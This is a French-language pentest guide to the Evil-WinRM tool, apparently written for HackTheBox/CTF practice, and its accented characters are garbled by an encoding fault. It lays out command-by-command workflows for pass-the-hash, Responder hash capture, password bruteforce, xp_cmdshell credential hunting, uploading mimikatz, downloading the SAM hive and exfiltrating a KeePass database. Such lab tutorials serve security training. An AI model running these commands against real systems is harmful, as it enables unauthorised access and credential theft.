# üëø Evil-WinRM - Guide Complet

[‚Üê Retour aux outils](README.md) | [‚Üê Retour √† la table des mati√®res](../README.md)

Evil-WinRM est un outil puissant permettant d'obtenir un **shell PowerShell interactif** sur une machine Windows √† distance via le protocole WinRM (Windows Remote Management).

---

## üìã Table des Mati√®res
- [Vue d'ensemble](#-vue-densemble)
- [Pr√©requis obligatoires](#-pr√©requis-obligatoires)
- [Installation](#-installation)
- [Utilisation de base](#-utilisation-de-base)
- [Commandes utiles une fois connect√©](#-commandes-utiles-une-fois-connect√©)
- [Workflow complet CTF/HTB](#-workflow-complet-ctfhtb)
- [Comparaison avec d'autres outils](#-comparaison-avec-dautres-outils)
- [Exemples pratiques](#-exemples-pratiques)

---

## üéØ Vue d'ensemble

### C'est quoi Evil-WinRM ?
Evil-WinRM = **SSH pour Windows** via le protocole WinRM

**‚úÖ Evil-WinRM SERT √Ä :**
- Obtenir un shell PowerShell distant sur Windows
- Ex√©cuter des commandes apr√®s avoir obtenu des credentials
- Uploader/downloader des fichiers
- Post-exploitation sur syst√®mes Windows

**‚ùå Evil-WinRM NE PEUT PAS :**
- Se connecter sans credentials valides
- Bruteforce des mots de passe
- Exploiter des vuln√©rabilit√©s
- Cr√©er des acc√®s (il utilise un acc√®s existant)

---

## ‚úÖ Pr√©requis obligatoires

### 1. Credentials valides
Tu DOIS avoir l'un des deux :
```bash
# Option 1 : Username + Password
Username: administrator
Password: badminton

# Option 2 : Username + Hash NTLM (Pass-the-Hash)
Username: administrator
Hash NTLM: 32ed87bdb5fdc5e9cba88547376818d4
```

### 2. Port WinRM ouvert sur la cible
```bash
# Port 5985 (HTTP) ou 5986 (HTTPS)
# V√©rifier avec nmap :
nmap -p 5985,5986 <IP>
```

**üí° Astuce :** Si le port 5985/5986 est ouvert, c'est un bon indicateur que tu pourras utiliser Evil-WinRM une fois les credentials obtenus.

---

## üîß Installation

```bash
# Installation via RubyGems (recommand√©)
gem install evil-winrm

# V√©rification de l'installation
evil-winrm --help
```

---

## üöÄ Utilisation de base

### Connexion avec mot de passe
```bash
evil-winrm -i <IP> -u <username> -p '<password>'

# Exemple concret :
evil-winrm -i 10.129.95.232 -u administrator -p 'badminton'
```

### Connexion avec hash NTLM (Pass-the-Hash)
```bash
evil-winrm -i <IP> -u <username> -H <NTLM_hash>

# Exemple concret :
evil-winrm -i 10.129.95.232 -u administrator -H '32ed87bdb5fdc5e9cba88547376818d4'
```

### Connexion HTTPS (port 5986)
```bash
evil-winrm -i <IP> -u <username> -p '<password>' -S

# Avec port personnalis√©
evil-winrm -i <IP> -u <username> -p '<password>' -P 5986 -S
```

**üí° Options utiles :**
- `-i` : Adresse IP de la cible
- `-u` : Nom d'utilisateur
- `-p` : Mot de passe
- `-H` : Hash NTLM
- `-S` : Utiliser SSL/TLS (HTTPS)
- `-P` : Port personnalis√© (d√©faut: 5985)

---

## üíª Commandes utiles une fois connect√©

### Informations syst√®me
```powershell
# Identit√© actuelle
whoami
whoami /priv
whoami /groups

# Informations syst√®me
systeminfo
hostname
ipconfig /all

# Version PowerShell
$PSVersionTable
```

### Navigation et fichiers
```powershell
# Navigation
dir
cd C:\Users\
Get-ChildItem -Recurse -Force

# Lire un fichier
type flag.txt
Get-Content flag.txt

# Chercher des fichiers
Get-ChildItem -Path C:\ -Recurse -Filter "*flag*" -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users\ -Recurse -Filter "*.txt" -ErrorAction SilentlyContinue
```

### Upload de fichiers (de ta machine ‚Üí cible)
```powershell
# Syntaxe
upload /chemin/local/fichier.exe C:\Temp\fichier.exe

# Exemples pratiques
upload /home/kali/winPEAS.exe C:\Temp\winPEAS.exe
upload /opt/tools/mimikatz.exe C:\Windows\Temp\mimikatz.exe
upload /home/kali/shell.ps1 C:\Users\Public\shell.ps1
```

### Download de fichiers (cible ‚Üí ta machine)
```powershell
# Syntaxe
download C:\chemin\distant\fichier.txt /chemin/local/fichier.txt

# Exemples pratiques
download C:\Users\Administrator\Desktop\flag.txt /home/kali/flag.txt
download C:\Windows\System32\config\SAM /home/kali/SAM
download C:\inetpub\wwwroot\web.config /home/kali/web.config
```

### √ânum√©ration des utilisateurs
```powershell
# Lister les utilisateurs
net user
net localgroup administrators
net localgroup "Remote Desktop Users"

# D√©tails d'un utilisateur
net user administrator
```

---

## üìã Workflow complet CTF/HTB

### √âtape 1 : Reconnaissance - Scanner WinRM
```bash
# V√©rifier si WinRM est ouvert
nmap -p 5985,5986 <IP>

# Scan d√©taill√© avec scripts NSE
nmap -p 5985,5986 -sV -sC <IP>
```

### √âtape 2 : Obtention de credentials

**M√©thode A : Capture de hash avec Responder**
```bash
# Lancer Responder pour capturer les hash NTLM
sudo responder -I tun0

# R√©sultat attendu :
# administrator::NTLM:32ed87bdb5fdc5e9cba88547376818d4
```

**M√©thode B : Cracking de hash**
```bash
# Cracker avec John
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

# Ou avec Hashcat
hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
```

**M√©thode C : Bruteforce SMB (puis utiliser les creds pour WinRM)**
```bash
# Bruteforce avec Hydra
hydra -l administrator -P /usr/share/wordlists/rockyou.txt <IP> smb

# Test de credentials avec CrackMapExec
crackmapexec smb <IP> -u administrator -p passwords.txt
```

**M√©thode D : √ânum√©ration de fichiers/bases de donn√©es**
```bash
# Rechercher dans fichiers de config, backups, etc.
# web.config, config.php, .env, database.sql, etc.
```

### √âtape 3 : Connexion avec Evil-WinRM
```bash
# Avec le password crack√©
evil-winrm -i <IP> -u administrator -p 'badminton'

# Ou directement avec le hash (Pass-the-Hash)
evil-winrm -i <IP> -u administrator -H '32ed87bdb5fdc5e9cba88547376818d4'
```

### √âtape 4 : Post-exploitation - Trouver les flags
```powershell
# Flag utilisateur
cd C:\Users\<username>\Desktop
type user.txt

# Flag root/admin
cd C:\Users\Administrator\Desktop
type root.txt

# Chercher r√©cursivement
Get-ChildItem -Path C:\Users\ -Recurse -Filter "*flag*" -ErrorAction SilentlyContinue
```

### √âtape 5 : Escalade de privil√®ges (si n√©cessaire)
```powershell
# Upload de WinPEAS pour √©num√©ration
upload /home/kali/winPEAS.exe C:\Temp\winPEAS.exe
C:\Temp\winPEAS.exe

# V√©rifier les privil√®ges
whoami /priv

# Chercher des mots de passe dans les fichiers
Get-ChildItem -Path C:\ -Recurse -Filter "*.txt" -ErrorAction SilentlyContinue | Select-String -Pattern "password"
```

---

## üÜö Comparaison avec d'autres outils

### Evil-WinRM vs Impacket (PSExec/WMIExec)

```
‚úÖ Evil-WinRM (Port 5985/5986 - WinRM) :
   - Port 5985/5986 (WinRM) ouvert
   - Shell PowerShell natif complet
   - Upload/Download int√©gr√© simple
   - Meilleure exp√©rience interactive
   - Environnement moderne Windows (>= Server 2012)
   - Support des scripts PowerShell avanc√©s
   - Bypass AMSI int√©gr√©
   - Pas de service cr√©√© sur la cible

‚úÖ Impacket PSExec (Port 445 - SMB) :
   - WinRM d√©sactiv√©/bloqu√©
   - Environnement legacy
   - Pass-the-Hash sans d√©pendance Ruby
   - Partie d'une suite compl√®te (secretsdump, etc.)
   - Shell CMD classique (pas PowerShell)
   - Cr√©e un service temporaire (PSEXESVC)
   - Plus de logs/traces

‚úÖ Impacket WMIExec (Port 135 - WMI) :
   - Plus discret que PSExec (pas de service)
   - Semi-interactif (l√©g√®re latence)
   - Port 135 souvent moins filtr√© que 445
   - Id√©al pour environnements avec EDR/AV
```

### Tableau de d√©cision rapide

| Crit√®re | Evil-WinRM | Impacket PSExec | Impacket WMIExec |
|---------|------------|-----------------|------------------|
| **Port requis** | 5985/5986 | 445 | 135 |
| **Type de shell** | PowerShell | CMD | CMD |
| **Interactivit√©** | ‚≠ê‚≠ê‚≠ê | ‚≠ê‚≠ê‚≠ê | ‚≠ê‚≠ê |
| **Upload/Download** | Natif | Via SMB | Via SMB |
| **Discr√©tion** | ‚≠ê‚≠ê | ‚≠ê | ‚≠ê‚≠ê‚≠ê |
| **Services cr√©√©s** | Aucun | PSEXESVC | Aucun |
| **Pass-the-Hash** | ‚úÖ | ‚úÖ | ‚úÖ |

### üéØ D√©cision rapide (workflow)

```bash
# 1Ô∏è‚É£ Scanner les ports
nmap -p 445,1433,5985,135 TARGET_IP

# 2Ô∏è‚É£ Choisir l'outil selon les ports ouverts :

# Si port 5985 ouvert ‚Üí Evil-WinRM (‚≠ê PR√âF√âR√â)
evil-winrm -i TARGET_IP -u admin -p 'password'

# Si port 5985 ferm√© mais 445 ouvert ‚Üí PSExec
impacket-psexec admin:password@TARGET_IP

# Si environnement surveill√©/EDR ‚Üí WMIExec (plus discret)
impacket-wmiexec admin:password@TARGET_IP
```

### Workflow combin√© : MSSQL ‚Üí Evil-WinRM

**Sc√©nario typique HTB/CTF :**

```bash
# 1Ô∏è‚É£ Connexion MSSQL (port 1433)
impacket-mssqlclient DOMAIN/sql_svc:password@IP -windows-auth

# 2Ô∏è‚É£ Activation xp_cmdshell
SQL> ENABLE_xp_cmdshell

# 3Ô∏è‚É£ Recherche de credentials admin (PowerShell History ‚≠ê)
SQL> xp_cmdshell "type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
# R√©sultat : net.exe use T: \\Server\share /user:administrator MEGACORP_4dm1n!!
# ‚Üí Password admin trouv√© !

# 4Ô∏è‚É£ Shell admin via Evil-WinRM (si port 5985 ouvert)
evil-winrm -i IP -u administrator -p 'MEGACORP_4dm1n!!'

# OU via PSExec (si port 445 ouvert)
impacket-psexec administrator:MEGACORP_4dm1n!!@IP

# 5Ô∏è‚É£ R√©cup√©ration des flags
*Evil-WinRM* PS C:\> type C:\Users\Administrator\Desktop\root.txt
```

**üîó Voir aussi :**
- [Impacket - Guide complet](impacket.md)
- [Workflow HTB/CTF Windows](../07-cheatsheets/htb-workflow.md)
- [MSSQL Enumeration](../03-enumeration/mssql.md)

| Outil | Protocole | Port | Usage principal | Pr√©requis |
|-------|-----------|------|-----------------|-----------|
| **Evil-WinRM** | WinRM | 5985/5986 | Shell PowerShell distant | Credentials + WinRM activ√© |
| **PSExec** (Impacket) | SMB | 445 | Shell CMD distant | Credentials + SMB + Droits admin |
| **WMIExec** (Impacket) | WMI | 135 | Shell semi-interactif | Credentials + WMI activ√© |
| **RDP** (xfreerdp) | RDP | 3389 | Bureau distant graphique | Credentials + RDP activ√© |
| **SSH** | SSH | 22 | Shell (Linux/Win10+) | Credentials + SSH activ√© |

### Quand utiliser Evil-WinRM ?
- ‚úÖ Port 5985/5986 ouvert
- ‚úÖ Tu as des credentials valides
- ‚úÖ Tu veux un shell PowerShell complet et interactif
- ‚úÖ Tu veux uploader/downloader des fichiers facilement

---

## üÜö Evil-WinRM vs Impacket - Quelle diff√©rence ?

### ‚ö†Ô∏è Point important
**Evil-WinRM n'est PAS un outil Impacket** - c'est une **alternative Ruby** ind√©pendante pour WinRM.

### Comparaison technique

```
üì¶ Impacket (Suite Python)
‚îú‚îÄ‚îÄ psexec.py     ‚Üí Shell via SMB (port 445)
‚îú‚îÄ‚îÄ wmiexec.py    ‚Üí Shell via WMI (port 135)
‚îú‚îÄ‚îÄ smbexec.py    ‚Üí Shell via SMB alternatif
‚îî‚îÄ‚îÄ [+ 50 autres outils pour Windows/AD]

üëø Evil-WinRM (Outil Ruby standalone)
‚îî‚îÄ‚îÄ Shell PowerShell via WinRM (port 5985/5986)
```

### Quand utiliser Evil-WinRM vs Impacket ?

| Crit√®re | Evil-WinRM | Impacket (psexec/wmiexec) |
|---------|-----------|---------------------------|
| **Port requis** | 5985/5986 (WinRM) | 445 (SMB) ou 135 (WMI) |
| **Type de shell** | PowerShell natif | CMD Windows |
| **Upload/Download** | ‚úÖ Tr√®s facile | ‚ö†Ô∏è Moins pratique |
| **Environnement** | Moderne (Win Server 2012+) | Legacy & Moderne |
| **Discr√©tion** | Moyen | psexec: Bruyant / wmiexec: Discret |
| **Installation** | `gem install evil-winrm` | `apt install impacket-scripts` |

### D√©cision rapide

```bash
‚úÖ Utilise Evil-WinRM si :
   - Port 5985/5986 (WinRM) est ouvert
   - Tu veux un shell PowerShell natif
   - Tu as besoin d'upload/download fr√©quents
   - Environnement moderne Windows

‚úÖ Utilise Impacket si :
   - Port 445 (SMB) ou 135 (WMI) ouvert
   - WinRM est d√©sactiv√©/bloqu√©
   - Tu veux faire du Pass-the-Hash
   - Environnement legacy ou AD complexe
   - Tu as besoin d'autres outils Impacket (secretsdump, etc.)
```

### Exemple de choix dans un sc√©nario HTB

```bash
# 1Ô∏è‚É£ Scanner les ports
nmap -p 445,1433,5985,5986 10.129.95.187

# R√©sultats :
# 445/tcp   open  microsoft-ds
# 1433/tcp  open  ms-sql-s
# 5985/tcp  open  wsman (WinRM)

# 2Ô∏è‚É£ Obtenir credentials via MSSQL
impacket-mssqlclient DOMAIN/sql_svc:password@10.129.95.187 -windows-auth
SQL> xp_cmdshell "type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
# ‚Üí Trouve password admin : MEGACORP_4dm1n!!

# 3Ô∏è‚É£ Choisir l'outil selon les ports ouverts

# Option A : Si WinRM (5985) ouvert ‚Üí Evil-WinRM
evil-winrm -i 10.129.95.187 -u administrator -p 'MEGACORP_4dm1n!!'

# Option B : Si SMB (445) ouvert ‚Üí Impacket psexec
impacket-psexec administrator:MEGACORP_4dm1n!!@10.129.95.187

# üí° Les deux fonctionnent, mais Evil-WinRM offre un meilleur shell
```

### Compatibilit√© Pass-the-Hash

```bash
# Evil-WinRM supporte aussi Pass-the-Hash
evil-winrm -i IP -u administrator -H 'NTHASH'

# Impacket psexec avec Pass-the-Hash
impacket-psexec administrator@IP -hashes :NTHASH

# üí° Les deux supportent PTH, choisis selon le port ouvert
```

### Outils compl√©mentaires

**Pour OBTENIR des credentials :**
- [Responder](../10-bruteforce/README.md) - Capture de hash NTLM
- [John/Hashcat](../10-bruteforce/README.md) - Cracking de hash
- [Hydra](hydra.md) - Bruteforce de passwords
- [CrackMapExec](crackmapexec.md) - Test et spray de credentials

**Puis UTILISER les credentials avec :**
- **Evil-WinRM** - Shell PowerShell (port 5985)
- [PSExec/WMIExec](../03-enumeration/smb-samba.md) - Shell via SMB (port 445)
- RDP - Bureau distant (port 3389)

---

## üí° Exemples pratiques

### Exemple 1 : HTB Machine - Connexion basique
```bash
# 1. Scanner la cible
nmap -p 5985 10.129.95.232

# 2. Obtenir password via √©num√©ration web
# (trouv√© dans un fichier config : badminton)

# 3. Connexion
evil-winrm -i 10.129.95.232 -u administrator -p 'badminton'

# 4. Trouver le flag
*Evil-WinRM* PS C:\> cd C:\Users\Administrator\Desktop
*Evil-WinRM* PS C:\> dir
*Evil-WinRM* PS C:\> type root.txt
```

### Exemple 2 : Pass-the-Hash apr√®s Responder
```bash
# 1. Capturer hash avec Responder
sudo responder -I tun0
# R√©sultat : administrator::DOMAIN:32ed87bdb5fdc5e9cba88547376818d4

# 2. Utiliser le hash directement (pas besoin de cracker)
evil-winrm -i 10.10.10.100 -u administrator -H '32ed87bdb5fdc5e9cba88547376818d4'

# 3. Post-exploitation
*Evil-WinRM* PS C:\> whoami
*Evil-WinRM* PS C:\> systeminfo
```

### Exemple 3 : Upload de WinPEAS pour √©num√©ration
```bash
# 1. Connexion
evil-winrm -i 10.10.10.100 -u bob -p 'P@ssw0rd123'

# 2. Upload de WinPEAS
*Evil-WinRM* PS C:\> upload /opt/tools/winPEAS.exe C:\Temp\winPEAS.exe

# 3. Ex√©cution
*Evil-WinRM* PS C:\> C:\Temp\winPEAS.exe

# 4. Analyser les r√©sultats pour escalade de privil√®ges
```

### Exemple 4 : Exfiltration de donn√©es
```bash
# 1. Connexion
evil-winrm -i 10.10.10.100 -u admin -p 'password'

# 2. Chercher des fichiers int√©ressants
*Evil-WinRM* PS C:\> Get-ChildItem -Path C:\Users\ -Recurse -Filter "*.kdbx" -ErrorAction SilentlyContinue

# 3. Download de la base KeePass trouv√©e
*Evil-WinRM* PS C:\> download C:\Users\bob\Documents\passwords.kdbx /home/kali/loot/passwords.kdbx

# 4. Cracker la base en local avec keepass2john + john
```

---

## üéØ R√©sum√© rapide

```
Evil-WinRM = Shell PowerShell distant sur Windows via WinRM

‚úÖ Tu as besoin de :
   - Login + Password (ou hash NTLM)
   - Port 5985/5986 ouvert
   
‚úÖ Utilisation :
   evil-winrm -i <IP> -u <user> -p '<pass>'
   
‚úÖ Une fois connect√© :
   - upload/download fichiers
   - Ex√©cuter commandes PowerShell
   - √ânum√©ration & post-exploitation
   
üîó S'inscrit dans le workflow :
   √ânum√©ration ‚Üí Obtenir creds ‚Üí Evil-WinRM ‚Üí Post-exploitation
```

---

## üìö Ressources

- [Documentation officielle Evil-WinRM](https://github.com/Hackplayers/evil-winrm)
- [Guide WinRM Microsoft](https://docs.microsoft.com/en-us/windows/win32/winrm/portal)
- [Pass-the-Hash expliqu√©](../04-exploitation/windows-vulns.md)
- [Escalade de privil√®ges Windows](../05-post-exploitation/windows-privesc.md)

